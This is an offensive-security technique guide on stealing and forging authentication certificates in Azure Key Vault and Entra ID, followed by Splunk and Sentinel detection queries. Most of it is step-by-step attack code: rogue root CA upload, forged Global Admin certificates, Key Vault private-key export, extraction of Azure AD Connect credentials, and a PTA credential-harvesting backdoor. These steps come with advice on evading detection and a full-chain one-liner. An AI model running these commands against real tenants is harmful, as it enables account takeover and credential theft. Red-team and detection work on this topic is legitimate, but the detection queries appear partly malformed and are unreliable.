# [CERT-AZURE-001]: Azure Key Vault Certificate Theft

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CERT-AZURE-001 |
| **MITRE ATT&CK v18.1** | [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID, Azure |
| **Severity** | **Critical** |
| **CVE** | CVE-2023-28432 (Related to cloud credential exposure patterns) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure all versions, Entra ID all versions |
| **Patched In** | N/A - Mitigation only, no vulnerability patch |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Key Vault Certificate Theft involves attackers extracting or abusing digital certificates stored in Azure Key Vault to establish persistent, passwordless authentication to Entra ID and Azure resources. This technique leverages Certificate-Based Authentication (CBA) to bypass traditional password-based security controls, including multi-factor authentication (MFA), enabling lateral movement and persistence in hybrid and cloud environments.

**Attack Surface:** Azure Key Vault (certificate endpoints), Entra ID authentication methods, Azure Resource Manager (ARM) APIs, and the managed identity credential chain.

**Business Impact:** **Critical - Full Environment Compromise.** An attacker exploiting this technique gains the ability to authenticate as any user in the Entra ID tenant, including Global Administrators, without requiring passwords or MFA, leading to complete compromise of Azure, Microsoft 365, and all federated applications. This enables data exfiltration, ransomware deployment, persistent backdoor installation, and regulatory compliance violations (GDPR, HIPAA, PCI-DSS fines up to 4% of annual revenue).

**Technical Context:** The technique requires either high-level Azure permissions (to enable CBA and upload malicious Root CAs) or direct access to Key Vault with certificate export permissions. Once a certificate is forged or stolen, it remains valid until certificate expiration, making password resets ineffective. Organizations with improper Conditional Access policies or disabled certificate validation enforcement are particularly vulnerable.

### Operational Risk

- **Execution Risk:** Medium - Requires either high-level permissions or Key Vault `Get` and `Export` permissions; easily detected if Certificate-Based Authentication is monitored.
- **Stealth:** Medium - CBA enablement generates audit logs (AuditLogs with OperationName = "Update authentication method policy"), but certificate-based sign-ins are harder to distinguish from legitimate activity without correlation analysis.
- **Reversibility:** No - Requires tenant incident response: certificate revocation, CBA disablement, and potential re-provisioning of all cloud-only admin accounts. Compromised hybrid accounts require on-premises AD remediation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1.1 | Ensure Azure AD multi-factor authentication is enabled for all users in administrative roles |
| **DISA STIG** | U-19045 | Azure must enforce certificate-based authentication for sensitive accounts |
| **CISA SCuBA** | AC-2 | Azure AD Account and Access Management |
| **NIST 800-53** | IA-5 | Authentication - Certificate-based authentication with strong controls |
| **NIST 800-53** | AC-3 | Access Enforcement - Restrict certificate issuance to authorized principals |
| **GDPR** | Art. 32 | Security of Processing - Cryptographic key and certificate management |
| **DORA** | Art. 9 | Protection and Prevention - Secure authentication controls |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Identity and Access Controls |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights (certificate-based credentials) |
| **ISO 27005** | Risk Assessment | Risk to "Compromise of Administration Interface via Certificates" |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- **For Certificate-Based Authentication (CBA) Abuse:** `Directory.ReadWrite.All` and `Organization.ReadWrite.All` (to enable CBA and upload CA certificates)
- **For Key Vault Certificate Extraction:** `Microsoft.KeyVault/vaults/certificates/read` and `Microsoft.KeyVault/vaults/certificates/getSecret/action` (or equivalent)

**Required Access:**
- Network access to Azure Resource Manager (ARM) API endpoints (`management.azure.com`)
- Network access to Key Vault endpoints (`*.vault.azure.net`)
- Authenticated session to Entra ID (user or service principal account)

**Supported Versions:**
- **Azure:** All regions and versions
- **Entra ID:** All tenants (including cloud-only and hybrid)
- **PowerShell:** 5.1+ (Desktop) or 7.0+ (Core)
- **Azure CLI:** 2.30.0+
- **Other Requirements:** 
  - Az.KeyVault PowerShell module (v3.0+)
  - Az.Identity module (v1.6+)
  - AADInternals module (latest version from GitHub)

**Tools:**
- [Azure PowerShell (Az module)](https://learn.microsoft.com/en-us/powershell/azure/install-azure-powershell)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli)
- [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals) (Free, community-maintained)
- [Certify.exe](https://github.com/Flangvik/SharpCollection/releases) (For hybrid AD CS enumeration)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure Portal Reconnaissance (GUI-Based)

**Identify Entra ID CBA Configuration Status:**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Authentication Methods**
2. Look for **Certificate-based authentication** entry
3. Check if it is **Enabled** or **Disabled**
4. If Enabled, note the **Certificate Authority** root certificates and the **Linked Users/Groups**

**What to Look For:**
- If CBA is already enabled, the tenant is **vulnerable to certificate forging attacks** (unless MFA is enforced at the CBA level)
- If CBA is disabled, attacker needs permissions to enable it (privilege escalation risk)
- Note the **Root CA certificates** listed—these are the trusted signing authorities

**Identify Azure Key Vault Certificates:**
1. Navigate to **Azure Portal** → **Key Vaults** → Select target Key Vault
2. Go to **Certificates** (left menu)
3. Note all certificate names, expiration dates, and **Subject Alternative Names (SANs)**
4. Certificates with `Client Authentication` EKU are valuable targets

**What to Look For:**
- Certificates with private key access enabled (indicated by "Certificate with Private Key" label)
- Certificates approaching expiration (easier to rationalize replacement for persistence)
- Certificates tied to service principals (automated credential theft)

### PowerShell Reconnaissance

**Check Current User Permissions on Key Vault:**
```powershell
# Connect to Azure
Connect-AzAccount

# List all Key Vaults the current user can access
Get-AzKeyVault

# Check permissions on a specific Key Vault
$vaultName = "YourKeyVaultName"
$vault = Get-AzKeyVault -VaultName $vaultName

# Get all certificates
$certificates = Get-AzKeyVaultCertificate -VaultName $vaultName
$certificates | Select-Object Name, Expires, Id

# Attempt to export a certificate (will show if export is allowed)
Try {
    Get-AzKeyVaultCertificate -VaultName $vaultName -Name "SensitiveCert" | Export-AzKeyVaultCertificate -FilePath "C:\Temp\test.pfx"
    Write-Host "Export ALLOWED - You have permission"
} Catch {
    Write-Host "Export DENIED - Error: $_"
}
```

**What to Look For:**
- If `Get-AzKeyVault` returns vaults, you have at least Read permissions
- If certificate export succeeds, you can steal certificates immediately
- If export is denied, you may need privilege escalation

**Check Entra ID Authentication Methods Configuration (Requires Directory.Read.All):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Directory.Read.All"

# Check if Certificate-Based Authentication is enabled
$authMethods = Get-MgIdentityAuthenticationMethodPolicy

# Retrieve CBA configuration
$cbaConfig = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/identity/authenticationMethods/certificateBasedAuthConfig"

# Output the Root CA certificates (if CBA is enabled)
$cbaConfig.trustedCertificateAuthorities | Select-Object CertificateThumbprint, DisplayName, IsActive
```

**What to Look For:**
- If CBA is active (`isEnabled = $true`), note the Root CA certificates
- If CBA is inactive, check what permissions you have to enable it (`Organization.ReadWrite.All`)
- Identify which users/groups are enrolled in CBA

### Azure CLI Reconnaissance

**List Key Vaults and Certificates:**
```bash
# List all Key Vaults
az keyvault list --output table

# List certificates in a specific Key Vault
az keyvault certificate list --vault-name YourKeyVaultName --output table

# Get details of a specific certificate
az keyvault certificate show --vault-name YourKeyVaultName --name CertificateName
```

**Check Certificate-Based Authentication:**
```bash
# Retrieve CBA configuration (requires appropriate Graph permissions)
az rest --method get --url "https://graph.microsoft.com/beta/identity/authenticationMethods/certificateBasedAuthConfig" --output json
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Enable Certificate-Based Authentication & Forge Certificates (GUI + PowerShell)

**Objective:** Enable CBA in the tenant, upload a malicious Root CA certificate, and forge valid authentication certificates to impersonate admin users.

**Supported Versions:** All versions of Entra ID and Azure

**Prerequisite Permissions Required:**
- `Directory.ReadWrite.All` - To update authentication methods
- `Organization.ReadWrite.All` - To configure organization-wide policies

**Step 1: Enable Certificate-Based Authentication in Entra ID**

**Manual Steps (Azure Portal):**
1. Log in to **Azure Portal** (`https://portal.azure.com`)
2. Navigate to **Entra ID** (left panel) → **Security** → **Authentication Methods**
3. Click on **Certificate-based authentication**
4. Toggle **Status** to **Enabled**
5. Under **Users/Groups**, select **All users** (or specific groups)
6. Click **Save**

**Expected Output:**
```
"Authentication method policy updated successfully"
```

**What This Means:**
- CBA is now enabled for the selected user scope
- Any certificate signed by a trusted Root CA will be accepted for authentication
- Next step is to add a malicious Root CA

**OpSec & Evasion:**
- This action generates an **AuditLogs entry** with OperationName `Update authentication method policy`
- Enable CBA during legitimate maintenance windows to blend with normal activity
- Use a service principal account with minimal permissions history to avoid detection

**Troubleshooting:**
- **Error:** "Permission Denied - Insufficient permissions"
  - **Cause:** Your account lacks `Directory.ReadWrite.All` or `Organization.ReadWrite.All`
  - **Fix:** Request the role through PIM (Privileged Identity Management) or ask a Global Admin to grant it

---

**Step 2: Create or Obtain a Root CA Certificate**

**Objective:** Obtain or generate a certificate that will be used to sign forged authentication certificates. This certificate must be added to Entra ID's trusted Root CAs.

**Manual Steps (Linux - Using OpenSSL):**
```bash
# Generate a self-signed Root CA certificate (valid for 10 years)
# This mimics a legitimate Certificate Authority

openssl genrsa -out ca_key.pem 2048
openssl req -new -x509 -days 3650 -key ca_key.pem -out ca_cert.pem \
    -subj "/CN=Contoso Company Root CA/O=Contoso/C=US"

# Convert to PFX format (Azure requires PFX for upload)
openssl pkcs12 -export -out ca_cert.pfx -inkey ca_key.pem -in ca_cert.pem \
    -password pass:YourPassword123
```

**Expected Output:**
```
ca_cert.pfx (PFX file containing both certificate and private key)
ca_cert.pem (Public certificate only)
```

**What This Means:**
- You now have a malicious Root CA certificate
- The `.pfx` file contains the private key (used to sign forged certificates)
- The `.pem` file contains only the public certificate (uploaded to Entra ID)

**OpSec & Evasion:**
- Use a certificate CN (Common Name) that appears legitimate (e.g., "Company Root CA")
- Keep the private key in secure storage (encrypted)
- Avoid reusing the same certificate across multiple attacks

---

**Step 3: Upload the Malicious Root CA to Entra ID's Trusted CAs**

**Objective:** Register the malicious Root CA so that certificates signed by it are trusted by Entra ID.

**Manual Steps (PowerShell):**
```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Directory.ReadWrite.All", "Organization.ReadWrite.All"

# Upload the Root CA certificate
$certPath = "C:\temp\ca_cert.pem"
$certContent = Get-Content -Path $certPath -Raw

# Add the certificate to the CBA trusted list
$body = @{
    displayName = "Contoso Malicious Root CA"
    certificate = $certContent
    isActive = $true
} | ConvertTo-Json

$response = Invoke-MgGraphRequest -Method POST `
    -Uri "https://graph.microsoft.com/beta/identity/authenticationMethods/certificateBasedAuthConfig/trustedCertificateAuthorities" `
    -Body $body `
    -ContentType "application/json"

Write-Host "Root CA uploaded successfully: $($response.Id)"
```

**Expected Output:**
```
Root CA uploaded successfully: ccb4c4c4-1234-1234-1234-cccccccccccc
```

**What This Means:**
- The malicious Root CA is now trusted by Entra ID
- Any certificate signed by this CA's private key will be accepted as valid
- Forged authentication certificates can now be used to impersonate users

**OpSec & Evasion:**
- This action generates an **AuditLogs entry**: OperationName = `Add trusted certificate authority` or similar
- Use a service principal with fresh credentials to avoid attribution

---

**Step 4: Create Forged Authentication Certificates for Target Users**

**Objective:** Generate certificates that impersonate high-value target users (e.g., Global Admins).

**Manual Steps (Using AADInternals):**
```powershell
# Import the AADInternals module (install if needed)
Install-Module AADInternals -Force
Import-Module AADInternals

# Load the private key from the PFX file
$pfxPath = "C:\temp\ca_cert.pfx"
$pfxPassword = ConvertTo-SecureString -String "YourPassword123" -AsPlainText -Force
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 ($pfxPath, $pfxPassword)

# Get the target user's ImmutableId (unique identifier in hybrid scenarios)
# For cloud-only users, you can use the UPN directly
$targetUser = "admin@contoso.onmicrosoft.com"
$immutableId = "XXXXXXXX" # Obtain from Azure AD (on-premises sync required)
$issuerUri = "https://adfs.contoso.com/adfs/services/trust"

# Create a forged authentication certificate
$forgedCert = New-AADIntCertificate `
    -UserPrincipalName $targetUser `
    -ImmutableId $immutableId `
    -IssuerUri $issuerUri `
    -CAKeyPath $cert

# Export the certificate to PFX
$forgedCert | Export-PfxCertificate -FilePath "C:\temp\forged_admin.pfx" `
    -Password (ConvertTo-SecureString "ForgedPassword123" -AsPlainText -Force)
```

**Expected Output:**
```
Certificate successfully created: admin@contoso.onmicrosoft.com
Exported to: C:\temp\forged_admin.pfx
```

**What This Means:**
- A forged certificate now exists that impersonates the Global Admin user
- This certificate can be used to authenticate to Entra ID and all connected services
- The certificate is valid until its expiration date (typically set to 1-5 years)

**OpSec & Evasion:**
- Certificate generation does not generate audit logs (client-side operation)
- Export and transfer the certificate in encrypted form
- Use a clean machine to avoid exposing the private key

---

**Step 5: Use the Forged Certificate for Authentication**

**Objective:** Authenticate to Azure and Microsoft 365 using the forged certificate, bypassing password and MFA.

**Manual Steps (Linux - Using curl + OpenSSL):**
```bash
# Convert the PFX to PEM format for use with curl
openssl pkcs12 -in forged_admin.pfx -out forged_admin.pem -nodes \
    -password pass:ForgedPassword123

# Authenticate to Azure using certificate-based authentication
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \
    --cert forged_admin.pem \
    --cert-type PEM \
    -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" \
    -d "scope=https://management.azure.com/.default" \
    -d "grant_type=client_credentials"
```

**Expected Output:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGc...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**What This Means:**
- You have successfully authenticated as the Global Admin user
- The access token can be used to access Azure APIs, Microsoft Graph, and Microsoft 365 resources
- MFA is bypassed (unless additional Conditional Access policies enforce certificate-level MFA)

**OpSec & Evasion:**
- Certificate-based sign-ins appear in sign-in logs (SigninLogs table in Sentinel)
- However, they are harder to distinguish from legitimate activity
- Perform actions during business hours to blend in

**Troubleshooting:**
- **Error:** "AADSTS700016: The certificate used is not valid for the requested use."
  - **Cause:** The forged certificate's EKU (Extended Key Usage) is not set to Client Authentication
  - **Fix:** Re-generate the certificate with correct EKU values

---

### METHOD 2: Extract Certificates from Azure Key Vault

**Objective:** Extract existing certificates (with private keys) from a Key Vault to use for authentication or signing attacks.

**Supported Versions:** All versions of Azure Key Vault

**Prerequisite Permissions Required:**
- `Microsoft.KeyVault/vaults/certificates/read`
- `Microsoft.KeyVault/vaults/certificates/getSecret/action` (to export private key)

**Step 1: Enumerate Key Vault Certificates**

**Manual Steps (PowerShell):**
```powershell
# Connect to Azure
Connect-AzAccount

# Get list of Key Vaults
$vaults = Get-AzKeyVault
Write-Host "Found $($vaults.Count) Key Vaults"

# For each vault, list certificates
foreach ($vault in $vaults) {
    Write-Host "`nVault: $($vault.VaultName)"
    
    $certs = Get-AzKeyVaultCertificate -VaultName $vault.VaultName
    foreach ($cert in $certs) {
        Write-Host "  - $($cert.Name) | Expires: $($cert.Expires) | Thumbprint: $($cert.Thumbprint)"
    }
}
```

**Expected Output:**
```
Vault: prod-kv-001
  - ssl-cert-contoso | Expires: 12/31/2025 | Thumbprint: ABC123DEF456...
  - app-auth-cert | Expires: 06/15/2027 | Thumbprint: XYZ789PQR321...

Vault: dev-kv-001
  - legacy-cert | Expires: 01/30/2026 | Thumbprint: QWE456RTY789...
```

**What to Look For:**
- Certificates with names indicating **authentication use** ("auth", "signin", "service-principal")
- Certificates with **long expiration dates** (more valuable for persistence)
- Certificates tied to **high-value service principals** (e.g., "adfs-cert", "federation-cert")

---

**Step 2: Export Certificates with Private Keys**

**Objective:** Download the certificate including its private key from the Key Vault.

**Manual Steps (PowerShell):**
```powershell
# Define the target certificate
$vaultName = "prod-kv-001"
$certName = "app-auth-cert"

# Download the certificate (without private key first)
$cert = Get-AzKeyVaultCertificate -VaultName $vaultName -Name $certName

# To get the private key, we need to retrieve the secret version
# The secret version matches the certificate version
$secretVersion = $cert.Version
$secret = Get-AzKeyVaultSecret -VaultName $vaultName -Name $certName -Version $secretVersion -AsPlainText

# Convert the secret to PFX (it's typically stored as base64-encoded PFX)
$pfxBytes = [Convert]::FromBase64String($secret)
$pfxPath = "C:\temp\stolen-$certName.pfx"
[System.IO.File]::WriteAllBytes($pfxPath, $pfxBytes)

Write-Host "Certificate exported to: $pfxPath"
```

**Expected Output:**
```
Certificate exported to: C:\temp\stolen-app-auth-cert.pfx
```

**What This Means:**
- You now have the certificate and its private key (in PFX format)
- This can be used for:
  - Impersonation of the service principal or user the certificate is tied to
  - Signing SAML assertions (if it's a federation certificate)
  - Authenticating to Azure APIs, Microsoft Graph, and other services

**OpSec & Evasion:**
- Exporting certificates generates **audit logs**:
  - **AuditLogs**: OperationName = `Download certificate`
  - **Key Vault Diagnostic Logs** (if enabled): `SecretGet` operation
- Time the export during normal business hours
- Export certificates for legitimate-sounding service principals to blend in

**Troubleshooting:**
- **Error:** "KeyVaultErrorAccessDenied: The user, group or application does not have permission..."
  - **Cause:** You lack `getSecret/action` permission
  - **Fix:** Use `az role assignment create` to grant the permission, or escalate privileges

---

**Step 3: Use the Stolen Certificate for Persistence**

**Objective:** Authenticate using the stolen certificate to maintain persistent access.

**Manual Steps (Using Azure CLI):**
```bash
# Convert PFX to PEM format
openssl pkcs12 -in stolen-app-auth-cert.pfx -out stolen-cert.pem -nodes

# Authenticate as the service principal using the certificate
az login --service-principal \
    -u "CLIENT_ID" \
    -p stolen-cert.pem \
    --tenant "TENANT_ID"

# List accessible resources
az resource list --output table

# Export all Key Vaults and their secrets (for data exfiltration)
az keyvault secret list --vault-name "prod-kv-001" --output table
```

**Expected Output:**
```
Name                            Kind    Value
──────────────────────────────  ──────  ─────────────
sql-admin-password              secret  ****
api-key-stripe                  secret  ****
db-connection-string            secret  ****
```

**What This Means:**
- You are now authenticated as the service principal
- You can access all resources the service principal has permissions for
- This provides persistent backdoor access

---

### METHOD 3: Exploit Azure AD Connect to Extract Certificates

**Objective:** Compromise an Azure AD Connect server to extract its synchronization account credentials and service principal certificate.

**Supported Versions:** All versions of Azure AD Connect

**Prerequisite Permissions Required:**
- Local administrative access to the Azure AD Connect server

**Step 1: Identify Azure AD Connect Servers**

**Manual Steps (PowerShell - On compromised server):**
```powershell
# Check if Azure AD Connect is installed
Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -like "*Azure AD Connect*" }

# Locate the AD Connect installation directory
$adConnectPath = "C:\Program Files\Microsoft Azure AD Connect"
if (Test-Path $adConnectPath) {
    Write-Host "Azure AD Connect found at: $adConnectPath"
    Get-ChildItem $adConnectPath -Recurse | Where-Object { $_.Name -like "*cert*" -or $_.Name -like "*pfx*" }
}
```

**What to Look For:**
- AD Connect service running (`ADSync` service)
- Synchronized directories configured

---

**Step 2: Extract AD Connect Synchronization Credentials**

**Objective:** Export the plaintext credentials of the AD DS Connector account and the Azure AD Connector account.

**Manual Steps (PowerShell - Admin required):**
```powershell
# Import AADInternals module
Import-Module AADInternals

# Extract the synchronization credentials (requires local admin on AD Connect server)
$syncCreds = Get-AADIntSyncCredentials

# Output the credentials
Write-Host "AD Connector Account: $($syncCreds.ADConnectorAccount)"
Write-Host "AD Connector Password: $($syncCreds.ADConnectorPassword)"
Write-Host "Azure AD Connector Account: $($syncCreds.AzureADConnectorAccount)"
Write-Host "Azure AD Connector Password: $($syncCreds.AzureADConnectorPassword)"

# If the Azure AD Connector account is a Global Admin, this is a critical finding
if ($syncCreds.AzureADConnectorAccount -like "*admin*") {
    Write-Host "[!] CRITICAL: AD Connect service account has Global Admin rights!"
}
```

**Expected Output:**
```
AD Connector Account: contoso.local\ADSync_12345
AD Connector Password: P@ssw0rd!Secure123
Azure AD Connector Account: Sync_ADConnect@contoso.onmicrosoft.com
Azure AD Connector Password: AzureP@ssw0rd!Secure456
[!] CRITICAL: AD Connect service account has Global Admin rights!
```

**What This Means:**
- You now have the credentials of accounts synchronized to Entra ID
- If the Azure AD Connector account has Global Admin rights, you control the tenant
- These credentials can be used for lateral movement and persistence

---

### METHOD 4: Exploit Azure AD Connect Certificate for PTA (Pass-Through Authentication) Backdoor

**Objective:** Extract the PTA (Pass-Through Authentication) agent certificate and create a backdoor agent.

**Supported Versions:** Azure AD Connect with PTA enabled

**Step 1: Export PTA Agent Certificates and Bootstrap**

**Manual Steps (PowerShell - On AD Connect server):**
```powershell
# Import AADInternals
Import-Module AADInternals

# Export the PTA agent certificate
$ptaCert = Export-AADIntProxyAgentCertificates
$ptaCert | Save-Object -Path "C:\temp\pta_cert.pfx"

# Export the PTA bootstrap (used to register new agents)
$ptaBoot = Export-AADIntProxyAgentBootstraps
$ptaBoot | Save-Object -Path "C:\temp\pta_bootstrap.bin"

Write-Host "PTA certificates and bootstrap exported"
```

**Expected Output:**
```
PTA certificates and bootstrap exported
```

**What This Means:**
- You have the PTA agent's authentication credentials
- These can be used to register a malicious PTA agent on an attacker-controlled machine
- The malicious agent can intercept and harvest credentials

---

**Step 2: Install Malicious PTA Agent on Attacker Machine**

**Objective:** Register a fake PTA agent to intercept authentication requests.

**Manual Steps (PowerShell - On attacker machine):**
```powershell
# Import AADInternals
Import-Module AADInternals

# Set up the malicious PTA agent using the stolen certificate
Set-AADIntPTACertificate -Certificate $ptaCert -Bootstrap $ptaBoot

# Inject PTASpy DLL for credential harvesting
Install-AADIntPTASpy

# Start harvesting credentials
While ($true) {
    $log = Get-AADIntPTASpyLog
    if ($log) {
        Write-Host "[!] Captured credentials:"
        $log | ForEach-Object { Write-Host "  User: $($_.username) | Password: $($_.password)" }
    }
    Start-Sleep -Seconds 5
}
```

**What This Means:**
- All authentication requests passing through the legitimate PTA service are now intercepted
- User credentials are harvested in plaintext
- No audit logs are generated (credentials captured on attacker-controlled agent)

**OpSec & Evasion:**
- The malicious agent appears legitimate to Azure (uses the stolen certificate)
- No alerts are generated unless certificate reuse is detected
- Monitor for multiple agents from different IP addresses

---

## 6. TOOLS & COMMANDS REFERENCE

### [AADInternals PowerShell Module](https://github.com/Gerenios/AADInternals)

**Version:** Latest (regularly updated)
**Minimum Version:** 0.6.0 (for CBA support)
**Supported Platforms:** Windows PowerShell 5.1+, PowerShell 7.0+ Core (cross-platform)

**Installation:**
```powershell
# Install from PowerShell Gallery
Install-Module AADInternals -Force

# Or clone from GitHub
git clone https://github.com/Gerenios/AADInternals.git
Import-Module .\AADInternals\AADInternals.psd1
```

**Critical Functions:**
- `Get-AADIntSyncCredentials` - Extract Azure AD Connect credentials
- `New-AADIntCertificate` - Create forged authentication certificates
- `Export-AADIntProxyAgentCertificates` - Extract PTA agent credentials
- `Export-AADIntProxyAgentBootstraps` - Extract PTA bootstrap data
- `Install-AADIntPTASpy` - Install credential harvesting backdoor
- `Get-AADIntPTASpyLog` - Retrieve harvested credentials

---

### [Azure PowerShell (Az module)](https://learn.microsoft.com/en-us/powershell/azure/)

**Version:** 8.0+
**Minimum Version:** 3.0.0
**Supported Platforms:** Windows, Linux, macOS

**Installation:**
```powershell
Install-Module Az -Repository PSGallery -Force
```

**Critical Cmdlets:**
- `Connect-AzAccount` - Authenticate to Azure
- `Get-AzKeyVault` - List Key Vaults
- `Get-AzKeyVaultCertificate` - List certificates
- `Get-AzKeyVaultSecret` - Extract certificate with private key

---

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** 2.30.0+
**Installation:**
```bash
# Windows
msiexec.exe /I Azure CLI.msi

# Linux/macOS
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

---

### One-Liner: Full Attack Chain

```powershell
# Complete attack chain (requires prerequisites)
$vaultName="prod-kv-001"; $certName="app-auth-cert"; 
$secret=(Get-AzKeyVaultSecret -VaultName $vaultName -Name $certName -AsPlainText);
$pfx=[Convert]::FromBase64String($secret); [IO.File]::WriteAllBytes("C:\temp\stolen.pfx",$pfx);
"[+] Certificate stolen to C:\temp\stolen.pfx"
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Suspicious Azure Key Vault Certificate Export

**Rule Configuration:**
- **Required Index:** `azure_audit_logs` or `main` (if Azure logs ingested)
- **Required Sourcetype:** `azure:aad:audit` or `azurediagnostics`
- **Required Fields:** `OperationName`, `ResultDescription`, `InitiatedBy`, `CallerIpAddress`
- **Alert Threshold:** Any instance of certificate export by non-service account
- **Applies To Versions:** All Azure versions

**SPL Query:**
```spl
index=azure_audit_logs OperationName IN ("Download certificate", "Get Certificate", "GetSecret") 
ResultDescription != "Forbidden" 
| stats count by InitiatedBy, CallerIpAddress, OperationName, ResourceId 
| where count > 0
```

**What This Detects:**
- Successful certificate downloads from Key Vault
- Potentially filtered to specific vaults or users with certificate management roles
- Identifies both legitimate and suspicious export attempts

**Manual Configuration Steps (Splunk):**
1. Log into Splunk Web → **Settings** → **Searches, reports, and alerts**
2. Click **+ New Alert**
3. Paste the SPL query above
4. Set **Trigger Condition** to `count > 0`
5. Configure **Alert Action** → Email to SOC team with details

---

### Rule 2: Certificate-Based Authentication Enabled in Entra ID

**Rule Configuration:**
- **Required Index:** `azure_audit_logs` or Unified Audit Log ingested
- **Required Sourcetype:** `azure:aad:audit`
- **Required Fields:** `OperationName`, `InitiatedBy`, `Result`, `CorrelationId`
- **Alert Threshold:** Any instance of CBA enablement
- **Applies To Versions:** All Entra ID versions

**SPL Query:**
```spl
index=azure_audit_logs (OperationName="Update authentication method policy" OR OperationName="Add trusted certificate authority") Result="Success" 
| stats count, latest(_time) as LastSeen by InitiatedBy.user, CallerIpAddress, OperationName 
| where count >= 1
```

**What This Detects:**
- Enables CBA in the tenant
- Adds malicious Root CAs to the trusted list
- Detects privilege escalation via service principals with Directory.ReadWrite.All

---

### Rule 3: Forged Certificate Authentication Sign-ins

**Rule Configuration:**
- **Required Index:** `azure_audit_logs` (SigninLogs table)
- **Required Sourcetype:** `azure:aad:signinlogs`
- **Required Fields:** `UserPrincipalName`, `AuthenticationDetails`, `ClientAppUsed`, `IPAddress`
- **Alert Threshold:** Certificate-based sign-in outside business hours or from unusual IP
- **Applies To Versions:** All Entra ID versions

**SPL Query:**
```spl
index=azure_audit_logs source="SigninLogs" AuthenticationDetails LIKE "%Certificate%" 
| stats count by UserPrincipalName, ClientAppUsed, IPAddress, AuthenticationDetails 
| where (date_mdy(NOW()) - strptime(_time, "%Y-%m-%d")) > 2 OR IPAddress NOT IN ("COMPANY_IP_RANGE")
```

**What This Detects:**
- Sign-ins authenticated via certificate (not password)
- Unusual IP addresses or after-hours access
- Service principal certificate authentication to sensitive APIs

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Certificate-Based Authentication Configuration Changes

**Rule Configuration:**
- **Required Table:** `AuditLogs`
- **Required Fields:** `OperationName`, `InitiatedBy`, `TargetResources`
- **Alert Severity:** **High**
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All Entra ID versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Update authentication method policy", "Add trusted certificate authority", "Set federation settings")
| where Result == "Success"
| project TimeGenerated, InitiatedBy, OperationName, TargetResources, CallerIpAddress, CorrelationId
| summarize AuthenticationChanges = dcount(OperationName) by InitiatedBy.user, CallerIpAddress
| where AuthenticationChanges > 1
```

**What This Detects:**
- Multiple authentication-related policy changes by a single principal
- Potential attacker preparing for certificate-based persistence

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious Certificate-Based Authentication Configuration`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

---

### Query 2: Forged Certificate Sign-ins to Azure Management APIs

**Rule Configuration:**
- **Required Table:** `SigninLogs` and `AuditLogs`
- **Alert Severity:** **Critical**
- **Frequency:** Real-time (every 1 minute)
- **Applies To Versions:** All Entra ID versions

**KQL Query:**
```kusto
SigninLogs
| where AuthenticationDetails has "Certificate"
| where AppDisplayName in ("Azure Management API", "Microsoft Graph", "Azure Resource Manager")
| where UserPrincipalName contains "@onmicrosoft.com"  // Cloud-only user
| project TimeGenerated, UserPrincipalName, AppDisplayName, AuthenticationDetails, ClientAppUsed, IPAddress, ResourceIdentity
| join kind=inner (AuditLogs 
  | where OperationName == "Add trusted certificate authority"
  | project TimeGenerated1=TimeGenerated, AddedCert=TargetResources
) on $left.TimeGenerated > $right.TimeGenerated
```

**What This Detects:**
- Certificate-based authentication immediately after a malicious CA is added
- Correlation between CBA enablement and actual certificate-based sign-ins
- High-confidence indicator of compromise

---

### Query 3: Key Vault Certificate Export Attempts

**Rule Configuration:**
- **Required Table:** `AzureDiagnostics` (from Key Vault logs)
- **Alert Severity:** **High**
- **Frequency:** Every 5 minutes

**KQL Query:**
```kusto
AzureDiagnostics
| where ResourceType == "VAULTS"
| where OperationName in ("SecretGet", "CertificateGet")
| where ResultSignature == "OK" or ResultSignature == "200"
| project TimeGenerated, OperationName, Identity, ResourceId, CallerIpAddress
| summarize ExportCount = count(), UniqueVaults = dcount(ResourceId) by Identity, CallerIpAddress
| where ExportCount > 5
```

**Manual Configuration Steps (PowerShell):**
```powershell
# Create KQL alert rule via PowerShell
$resourceGroup = "MyResourceGroup"
$workspaceName = "MySentinelWorkspace"
$ruleName = "Suspicious Key Vault Certificate Exports"

New-AzSentinelAlertRule -ResourceGroupName $resourceGroup `
  -WorkspaceName $workspaceName `
  -DisplayName $ruleName `
  -Query @"
AzureDiagnostics
| where ResourceType == "VAULTS"
| where OperationName in ("SecretGet", "CertificateGet")
| where ResultSignature == "OK"
